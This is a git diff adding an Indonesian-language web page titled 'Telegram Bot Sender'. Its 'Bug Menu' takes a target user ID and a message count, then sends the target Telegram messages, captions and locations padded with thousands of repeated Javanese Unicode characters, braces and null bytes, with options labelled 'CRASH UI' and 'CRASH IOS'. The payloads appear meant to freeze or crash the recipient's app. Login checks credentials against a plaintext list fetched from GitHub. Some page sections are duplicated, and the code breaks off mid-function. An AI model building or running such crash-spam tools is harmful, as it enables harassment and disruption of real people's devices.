@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Telegram Bot Sender</title>
+<style>
+  /* ===== Body dan background ===== */
+  body {
+    margin: 0; padding: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #000428 0%, #004e92 100%);
+    color: white;
+    /* Jangan overflow hidden supaya sidebar bisa muncul */
+    overflow-x: hidden;
+    overflow-y: auto;
+  }
+
+  /* ===== Efek smoke animasi ===== */
+  .smoke {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    pointer-events: none;
+    background: radial-gradient(circle at 30% 40%, rgba(255, 0, 0, 0.15), transparent 50%),
+                radial-gradient(circle at 70% 60%, rgba(255, 50, 50, 0.12), transparent 50%),
+                radial-gradient(circle at 50% 30%, rgba(200, 0, 0, 0.1), transparent 50%);
+    animation: smokeMove 10s infinite alternate ease-in-out;
+    z-index: 0;
+  }
+  @keyframes smokeMove {
+    0% {background-position: 30% 40%, 70% 60%, 50% 30%;}
+    100% {background-position: 32% 42%, 68% 58%, 52% 32%;}
+  }
+
+  /* ===== Sidebar ===== */
+  .sidebar {
+    height: 100vh;
+    width: 0;
+    position: fixed;
+    z-index: 9999;
+    top: 0;
+    right: 0;
+    background-color: rgba(0,0,0,0.9);
+    overflow-x: hidden;
+    transition: 0.3s;
+    padding-top: 60px;
+    box-shadow: -2px 0 10px rgba(255,0,0,0.7);
+    display: flex;
+    flex-direction: column;
+    color: white;
+  }
+  .sidebar a {
+    padding: 12px 20px;
+    text-decoration: none;
+    font-size: 18px;
+    color: #ff4444;
+    display: block;
+    transition: 0.3s;
+  }
+  .sidebar a:hover {
+    background-color: #330000;
+    color: #ff9999;
+  }
+  .closebtn {
+    position: absolute;
+    top: 12px;
+    left: 15px;
+    font-size: 36px;
+    cursor: pointer;
+    color: #ff4444;
+    user-select: none;
+  }
+  .sidebar-user {
+    padding: 10px 20px;
+    font-weight: bold;
+    border-bottom: 1px solid #ff4444;
+    margin-bottom: 15px;
+  }
+  #lastLoginSidebar {
+    padding: 5px 20px 15px 20px;
+    font-size: 14px;
+    color: gold;
+  }
+
+  /* ===== Menu button hamburger ===== */
+  .menu-btn {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    font-size: 30px;
+    cursor: pointer;
+    color: #ff4444;
+    z-index: 10000;
+    user-select: none;
+    background: rgba(0,0,0,0.6);
+    border-radius: 6px;
+    padding: 5px 10px;
+    transition: background-color 0.3s;
+  }
+  .menu-btn:hover {
+    background-color: rgba(255,0,0,0.8);
+  }
+
+  /* ===== User info top right ===== */
+  .user-info {
+    position: fixed;
+    top: 15px;
+    right: 65px;
+    color: #ff4444;
+    font-weight: bold;
+    font-size: 16px;
+    z-index: 10000;
+    user-select: none;
+    display: none;
+  }
+
+  /* ===== Halaman utama .page ===== */
+  .page {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    position: relative;
+    z-index: 10;
+    padding: 10px;
+    box-sizing: border-box;
+  }
+
+  /* ===== Container utama ===== */
+  .container {
+    background: rgba(0, 0, 0, 0.7);
+    padding: 25px 30px;
+    border-radius: 15px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 0 15px rgba(255, 0, 0, 0.6);
+    animation: slideUp 0.8s ease;
+    box-sizing: border-box;
+  }
+
+  @keyframes slideUp {
+    from {transform: translateY(50px); opacity: 0;}
+    to {transform: translateY(0); opacity: 1;}
+  }
+
+  /* ===== Logo ===== */
+  .logo {
+    width: 80px; height: 80px; border-radius: 50%;
+    margin: 0 auto 15px auto;
+    display: block;
+    border: 2px solid #ff0000;
+    box-shadow: 0 0 10px #ff0000;
+  }
+
+  /* ===== Nama bot ===== */
+  .bot-name {
+    text-align: center;
+    font-weight: bold;
+    font-size: 24px;
+    margin-bottom: 25px;
+    text-shadow: 0 0 10px #ff0000;
+  }
+
+  /* ===== Input dan button ===== */
+  input[type="text"],
+  input[type="password"],
+  input[type="number"],
+  select {
+    width: 100%;
+    padding: 12px 10px;
+    margin: 8px 0;
+    border-radius: 8px;
+    border: none;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background-color: #ff0000;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: bold;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #cc0000;
+  }
+
+  /* ===== Link di dalam teks ===== */
+  a {
+    color: #ff6666;
+    cursor: pointer;
+    text-decoration: underline;
+  }
+  a:hover {
+    color: #ff2222;
+  }
+
+  /* ===== Console output styling ===== */
+  #consoleOutput {
+    background: rgba(0,0,0,0.8);
+    border-radius: 10px;
+    padding: 10px;
+    height: 150px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    font-family: monospace;
+    font-size: 14px;
+    box-sizing: border-box;
+    margin-top: 10px;
+  }
+
+  /* Scrollbar styling for console */
+  #consoleOutput::-webkit-scrollbar {
+    width: 8px;
+  }
+  #consoleOutput::-webkit-scrollbar-thumb {
+    background: #ff4444;
+    border-radius: 4px;
+  }
+
+  /* Blink class for last login */
+  .blink {
+    animation: blinkAnim 1.5s infinite;
+  }
+  @keyframes blinkAnim {
+    0%, 100% {opacity: 1;}
+    50% {opacity: 0.5;}
+  }
+
+</style>
+</head>
+<body>
+
+<div class="smoke"></div>
+
+<!-- Sidebar -->
+<div id="mySidebar" class="sidebar">
+  <span class="closebtn" onclick="closeNav()">&times;</span>
+  <div id="sidebarUser" class="sidebar-user">Login: -</div>
+  <div id="lastLoginSidebar" style="display:none;"></div>
+  <a href="#" onclick="showPage('pageDashboard')">🏠 Dashboard</a>
+  <a href="#" onclick="showPage('page1')">🤖 Add Token Bot</a>
+  <a href="#" onclick="showPage('pageSpam')">🐞 Bug Menu</a>
+  <a href="#" onclick="logout()" style="color: #ff6666; font-weight: bold;">🚪 Logout</a>
+</div>
+
+<!-- user info top right -->
+<span id="userInfoTop" class="user-info"></span>
+
+<!-- Menu button (hamburger) -->
+<span id="menuButton" class="menu-btn" onclick="openNav()" style="display:none;">☰</span>
+
+<!-- Page: Login -->
+<div id="pageLogin" class="page" style="display:flex;">
+  <div class="container">
+    <img src="https://files.catbox.moe/si9eel.png" alt="Logo" class="logo" />
+    <div class="bot-name">Telegram Bot Sender</div>
+    <input type="text" id="loginUsername" placeholder="Username" autocomplete="off" />
+    <input type="password" id="loginPassword" placeholder="Password" autocomplete="off" />
+    <button onclick="validateLogin()">Login</button>
+    <p id="loginError" style="color:#ff4444; margin-top:10px;"></p>
+    <button id="developerButton" style="display:none; margin-top:10px;" onclick="openDeveloper()">DEVELOPER</button>
+  </div>
+</div>
+
+<!-- Halaman Dashboard -->
+<div id="pageDashboard" class="page" style="display:none;">
+  <div class="container" style="text-align:center;">
+    <h2>Selamat Datang di Dashboard</h2>
+    <p id="dashboardWelcome"></p>
+    <p>Silakan pilih menu di kanan atas untuk mulai.</p>
+  </div>
+</div>
+
+<!-- Halaman Token -->
+<div id="page1" class="page" style="display:none;">
+  <div class="container">
+    <img src="https://files.catbox.moe/si9eel.png" alt="Logo" class="logo" />
+    <div class="bot-name">Telegram Bot Sender</div>
+    <input type="password" id="botTokenInput" placeholder="Masukkan Token Bot Telegram" />
+    <button onclick="checkToken()">Lanjut</button>
+<button style="margin-top:10px; background-color:#555;" onclick="hapusToken()">Hapus Token</button>
+  </div>
+</div>
+
+<!-- Halaman Loading -->
+<div id="pageLoading" class="page" style="display:none;">
+  <div class="container">
+    <h3>Memeriksa token...</h3>
+  </div>
+</div>
+
+<!-- Halaman Bug Menu (Spam) -->
+<div id="pageSpam" class="page" style="display:none;">
+  <div class="container">
+    <img src="https://files.catbox.moe/si9eel.png" alt="Logo" class="logo" />
+    <div class="bot-name">Telegram Bot Sender</div>
+    <input type="text" id="targetId" placeholder="ID atau username target" />
+    <input type="number" id="msgCount" placeholder="Jumlah pesan" value="1" min="1" />
+    <select id="messageSelect">
+      <option value="" disabled selected>Pilih Menu Fitur</option>
+      <option value="crash_ui">CRASH UI</option>
+      <option value="crash_ios">CRASH IOS</option>
+    </select>
+    <button onclick="sendSpam()">Kirim</button>
+    <h3>Log:</h3>
+    <pre id="consoleOutput"></pre>
+  </div>
+</div>
+
+<!-- Toast Notifikasi -->
+<div id="toast" style="
+  visibility: hidden;
+  min-width: 250px;
+  margin-left: -125px;
+  background-color: #ff4444;
+  color: #fff;
+  text-align: center;
+  border-radius: 8px;
+  padding: 16px;
+  position: fixed;
+  z-index: 99999;
+  left: 50%;
+  bottom: 30px;
+  font-size: 17px;
+  box-shadow: 0 0 10px rgba(255,0,0,0.7);
+">
+  <span id="toastMessage"></span>
+</div>
+
+<script>
+// URL file user list di GitHub
+const GITHUB_USER_LIST_URL = "https://raw.githubusercontent.com/Gupong170/DatabaseWebBug/main/webbug.txt";
+
+// Ambil daftar user valid dari GitHub
+async function fetchValidUsers() {
+  try {
+    const response = await fetch(GITHUB_USER_LIST_URL + "?_=" + Date.now()); // cache buster
+    const text = await response.text();
+
+    return text
+      .split("\n")
+      .map(line => line.trim())
+      .filter(line => line)
+      .map(line => {
+        const [username, password] = line.split(":");
+        return { username, password };
+      });
+  } catch (error) {
+    alert("❌ Gagal mengambil daftar user dari server");
+    return [];
+  }
+}
+
+// Validasi login user
+async function validateLogin() {
+  const USERNAME = document.getElementById("loginUsername").value.trim();
+  const PASSWORD = document.getElementById("loginPassword").value.trim();
+  const errorEl = document.getElementById("loginError");
+
+  if (!USERNAME || !PASSWORD) {
+    errorEl.textContent = "Username dan password harus diisi!";
+    return;
+  }
+
+  const validUsers = await fetchValidUsers();
+  const isValid = validUsers.some(
+    user => user.username === USERNAME && user.password === PASSWORD
+  );
+
+  if (!isValid) {
+    errorEl.textContent = "Username atau password salah!";
+    return;
+  }
+
+  // Login berhasil
+  localStorage.setItem("loggedInUser", USERNAME);
+  localStorage.setItem("lastLogin", new Date().toString());
+  document.getElementById("loginError").textContent = "";
+
+  alert(`✅ Login berhasil sebagai ${USERNAME}`);
+
+  // Update UI login
+  loggedInUser = USERNAME;
+  document.getElementById("menuButton").style.display = "block";
+  document.getElementById("userInfoTop").textContent = `Halo, ${USERNAME}`;
+  document.getElementById("userInfoTop").style.display = "block";
+  document.getElementById("sidebarUser").textContent = `Login: ${USERNAME}`;
+
+  updateLastLoginUI(new Date().toString());
+  updateDashboardWelcome();
+  showPage("pageDashboard");
+}
+
+function loginSuccess(username, isAdmin) {
+  document.getElementById("loginError").textContent = "";
+  loggedInUser = username;
+  window.isAdmin = isAdmin;  // buat variabel global isAdmin
+  const loginTime = new Date().toString();
+  localStorage.setItem("loggedInUser", loggedInUser);
+  localStorage.setItem("lastLogin", loginTime);
+  localStorage.setItem("isAdmin", isAdmin);
+
+  document.getElementById("menuButton").style.display = "block";
+  document.getElementById("userInfoTop").textContent = `Halo, ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+  document.getElementById("userInfoTop").style.display = "block";
+  document.getElementById("sidebarUser").textContent = `Login: ${loggedInUser}`;
+
+  updateLastLoginUI(loginTime);
+  updateDashboardWelcome();
+
+  showPage("pageDashboard");
+}
+</script>
+
+<!-- Halaman Dashboard -->
+<div id="pageDashboard" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container" style="text-align:center;">
+    <h2>Selamat Datang di Dashboard</h2>
+    <p id="dashboardWelcome"></p>
+    <p>Silakan pilih menu di kanan atas untuk mulai.</p>
+  </div>
+</div>
+
+<!-- Halaman Token -->
+<div id="page1" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <img src="https://files.catbox.moe/si9eel.png" alt="Logo" class="logo" />
+    <div class="bot-name">Telegram Bot Sender</div>
+    <input type="password" id="botTokenInput" placeholder="Masukkan Token Bot Telegram" />
+    <button onclick="checkToken()">Lanjut</button>
+  </div>
+</div>
+
+<!-- Halaman Loading -->
+<div id="pageLoading" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <h3>Memeriksa token...</h3>
+  </div>
+</div>
+
+<!-- Halaman Bug Menu (Spam) -->
+<div id="pageSpam" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <img src="https://files.catbox.moe/si9eel.png" alt="Logo" class="logo" />
+    <div class="bot-name">Telegram Bot Sender</div>
+    <input type="text" id="targetId" placeholder="ID atau username target" />
+    <input type="number" id="msgCount" placeholder="Jumlah pesan" value="1" min="1" />
+    <select id="messageSelect">
+      <option value="" disabled selected>Pilih Menu Fitur</option>
+      <option value="crash_ui">CRASH UI</option>
+      <option value="crash_ios">CRASH IOS</option>
+    </select>
+    <button onclick="sendSpam()">Kirim</button>
+    <h3>Log:</h3>
+    <pre id="consoleOutput"></pre>
+  </div>
+</div>
+
+<script>
+let botToken = localStorage.getItem("botToken") || "";
+let loggedInUser = "";
+let isAdmin = false;
+
+/* Update tampilan input token sesuai status token tersimpan */
+function updateTokenInputUI() {
+  const tokenInput = document.getElementById("botTokenInput");
+  if (botToken) {
+    tokenInput.value = botToken;
+    tokenInput.disabled = true;
+  } else {
+    tokenInput.value = "";
+    tokenInput.disabled = false;
+  }
+}
+
+/* Fungsi cek token bot Telegram */
+function checkToken() {
+  // Jika sudah ada token tersimpan
+  if (botToken) {
+    alert("Token bot Telegram sudah tersimpan. Tidak perlu menambahkan ulang.");
+    showPage("pageDashboard");
+    return;
+  }
+
+  const inputToken = document.getElementById("botTokenInput").value.trim();
+  if (!inputToken) {
+    alert("Masukkan token bot!");
+    return;
+  }
+  showPage("pageLoading");
+
+  fetch(`https://api.telegram.org/bot${inputToken}/getMe`)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        botToken = inputToken;
+        localStorage.setItem("botToken", botToken);
+        alert("Token valid dan sudah disimpan.");
+        updateTokenInputUI();
+        showPage("pageDashboard");
+      } else {
+        alert("Token tidak valid!");
+        showPage("page1");
+      }
+    })
+    .catch(() => {
+      alert("Gagal memeriksa token!");
+      showPage("page1");
+    });
+}
+
+function showToast(message) {
+  const toast = document.getElementById("toast");
+  const toastMessage = document.getElementById("toastMessage");
+  toastMessage.textContent = message;
+  toast.style.visibility = "visible";
+  toast.style.opacity = "1";
+  setTimeout(() => {
+    toast.style.visibility = "hidden";
+    toast.style.opacity = "0";
+  }, 3000);
+}
+
+function hapusToken() {
+  if (!botToken) {
+    showToast("❌ Tidak ada token bot yang tersimpan");
+    return;
+  }
+  if (confirm("Yakin ingin menghapus token?")) {
+    localStorage.removeItem("botToken");
+    botToken = "";
+    updateTokenInputUI();
+    showToast("✅ Token berhasil dihapus");
+  }
+}
+
+/* Fungsi untuk membuat pesan crash UI */
+async function sendCrashUI(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  try {
+    // Ambil gambar dari URL (mirip di BlankCrashCatalog)
+    const imageUrl = 'https://files.catbox.moe/pgmp7v.png';
+    const caption = "Rann Nih broo\n\n" +
+                    "ꦽ".repeat(500) +  // isi spam unicode
+                    "ꦾ".repeat(500);
+
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        photo: imageUrl,
+        caption: caption
+      })
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      document.getElementById("consoleOutput").textContent += `crash UI terkirim ke ${target}\n`;
+    } else {
+      document.getElementById("consoleOutput").textContent += `❌ Gagal: ${data.description}\n`;
+    }
+  } catch (err) {
+    document.getElementById("consoleOutput").textContent += `⚠ Error: ${err.message}\n`;
+  }
+}
+
+/* Fungsi lokasi crash UI untuk Telegram */
+async function sendLocaCrashUI(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+  
+  try {
+    const lat = 0.0;
+    const lon = 0.0;
+    const title = "DO YOU KNOW ME?¿ RANN" + "ꦽ".repeat(2000);
+
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        latitude: lat,
+        longitude: lon
+      })
+    });
+
+    const data = await res.json();
+
+    if (data.ok) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: target,
+          text: title + "\n\n" + "Rann Not Dev" + "ꦾ".repeat(2000)
+        })
+      });
+      document.getElementById("consoleOutput").textContent += `📍 Lokasi crash UI terkirim ke ${target}\n`;
+    } else {
+      document.getElementById("consoleOutput").textContent += `❌ Gagal kirim lokasi: ${data.description}\n`;
+    }
+  } catch (err) {
+    document.getElementById("consoleOutput").textContent += `⚠ Error kirim lokasi: ${err.message}\n`;
+  }
+}
+
+/* Adaptasi LocaPayloadFc untuk Telegram Web */
+async function sendLocaPayloadFc(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    return;
+  }
+
+  const steps = [
+    {
+      type: "message",
+      text: "</> Rann Not Dev\n\n" + "{".repeat(2000)
+    },
+    {
+      type: "message",
+      text: "@pnx_loophole\n" + "{".repeat(1000)
+    },
+    {
+      type: "message",
+      text: "Changli Crashers\n" + "{".repeat(2000)
+    },
+    {
+      type: "location",
+      lat: 0,
+      lon: 0
+    },
+    {
+      type: "photo",
+      url: "https://via.placeholder.com/1", // gambar kosong
+      caption: "FINIX - CRITICAL FINISH\nAi To Crash " + "\u0000".repeat(50)
+    }
+  ];
+
+  for (let i = 0; i < steps.length; i++) {
+    try {
+      let res;
+      if (steps[i].type === "message") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            text: steps[i].text
+          })
+        });
+      } else if (steps[i].type === "location") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            latitude: steps[i].lat,
+            longitude: steps[i].lon
+          })
+        });
+      } else if (steps[i].type === "photo") {
+        res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: target,
+            photo: steps[i].url,
+            caption: steps[i].caption
+          })
+        });
+      }
+
+      const data = await res.json();
+      if (data.ok) {
+        document.getElementById("consoleOutput").textContent += `✅ Step ${i + 1} terkirim.\n`;
+      } else {
+        document.getElementById("consoleOutput").textContent += `❌ Step ${i + 1} gagal: ${data.description}\n`;
+      }
+
+      await new Promise(res => setTimeout(res, 500));
+    } catc
